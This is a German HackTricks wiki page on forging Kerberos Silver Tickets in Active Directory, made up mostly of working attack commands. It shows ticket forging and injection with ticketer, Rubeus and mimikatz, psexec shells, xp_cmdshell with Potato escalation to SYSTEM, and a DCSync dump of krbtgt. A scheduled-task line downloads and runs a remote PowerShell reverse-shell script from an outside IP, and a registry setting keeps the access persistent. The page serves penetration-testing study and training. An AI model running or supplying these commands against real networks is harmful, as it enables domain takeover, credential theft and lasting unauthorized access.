# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Der **Silver Ticket**-Angriff beinhaltet die Ausnutzung von Service-Tickets in Active Directory (AD)-Umgebungen. Diese Methode beruht darauf, den **NTLM hash eines service account**, beispielsweise eines computer account, zu erlangen, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen und sich als beliebiger Benutzer ausgeben, typischerweise mit dem Ziel administrativer Privilegien. Es wird betont, dass die Verwendung von AES keys zum Fälschen von Tickets sicherer und weniger detektierbar ist.

> [!WARNING]
> Silver Tickets sind weniger detektierbar als Golden Tickets, weil sie nur den **hash of the service account** benötigen, nicht das krbtgt account. Allerdings sind sie auf den spezifischen Dienst beschränkt, den sie angreifen. Außerdem reicht es, einfach das Passwort eines Benutzers zu stehlen.
> Wenn du das **account's password with a SPN** kompromittierst, kannst du dieses Passwort verwenden, um einen Silver Ticket zu erstellen, der sich gegenüber diesem Dienst als beliebiger Benutzer ausgibt.

For ticket crafting, different tools are employed based on the operating system:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Unter Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Der CIFS-Dienst wird als häufiges Ziel hervorgehoben, um auf das Dateisystem des Opfers zuzugreifen, aber andere Dienste wie HOST und RPCSS können ebenfalls für Tasks und WMI-Abfragen ausgenutzt werden.

### Beispiel: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Wenn du den NTLM-Hash (oder AES-Key) eines SQL-Servicekontos (z. B. sqlsvc) hast, kannst du ein TGS für den MSSQL SPN fälschen und dich gegenüber dem SQL-Service als beliebiger Benutzer impersonifizieren. Von dort aus xp_cmdshell aktivieren, um Befehle als das SQL-Servicekonto auszuführen. Wenn dieses Token SeImpersonatePrivilege hat, kannst du eine Potato chainen, um auf SYSTEM zu eskalieren.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Wenn der resultierende Kontext SeImpersonatePrivilege hat (oft der Fall bei service accounts), verwende eine Potato-Variante, um SYSTEM zu erhalten:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Weitere Details zum Missbrauch von MSSQL und zur Aktivierung von xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Übersicht der Potato-Techniken:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Verfügbare Dienste

| Diensttyp                                   | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Je nach OS auch:</p><p>WSMAN</p><p>RPCSS</p>      |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In manchen Fällen können Sie einfach WINRM anfordern</p> |
| Geplante Tasks                             | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP-Operationen, inklusive DCSync         | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Mit **Rubeus** können Sie **alle** diese Tickets mit dem Parameter anfordern:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event-IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon

## Persistenz

Um zu verhindern, dass Maschinen ihr Passwort alle 30 Tage ändern, setzen Sie `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` oder Sie können `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` auf einen größeren Wert als 30 Tage setzen, um die Rotationsperiode anzugeben, nach der das Maschinenpasswort geändert werden soll.

## Missbrauch von Service-Tickets

In den folgenden Beispielen nehmen wir an, dass das Ticket durch das Impersonieren des Administrator-Kontos abgerufen wurde.

### CIFS

Mit diesem Ticket können Sie auf die Ordner `C$` und `ADMIN$` über **SMB** zugreifen (wenn sie freigegeben sind) und Dateien in einen Teil des entfernten Dateisystems kopieren, indem Sie etwas wie Folgendes tun:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Du kannst auch eine Shell auf dem Host erhalten oder beliebige Befehle mit **psexec** ausführen:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Mit dieser Berechtigung kannst du auf entfernten Computern geplante Aufgaben erstellen und beliebige Befehle ausführen:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Mit diesen Tickets kannst du **WMI auf dem Zielsystem ausführen**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Auf der folgenden Seite findest du weitere Informationen zu **wmiexec**:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Mit winrm-Zugang zu einem Computer kannst du **auf ihn zugreifen** und sogar eine PowerShell erhalten:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Siehe die folgende Seite, um **weitere Möglichkeiten zu erfahren, wie man sich mit einem entfernten Host über winrm verbindet**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Beachte, dass **winrm auf dem entfernten Computer aktiv sein und lauschen muss**, um darauf zugreifen zu können.

### LDAP

Mit diesem Recht kannst du die DC-Datenbank mit **DCSync** dumpen:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Erfahre mehr über DCSync** auf der folgenden Seite:


{{#ref}}
dcsync.md
{{#endref}}


## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
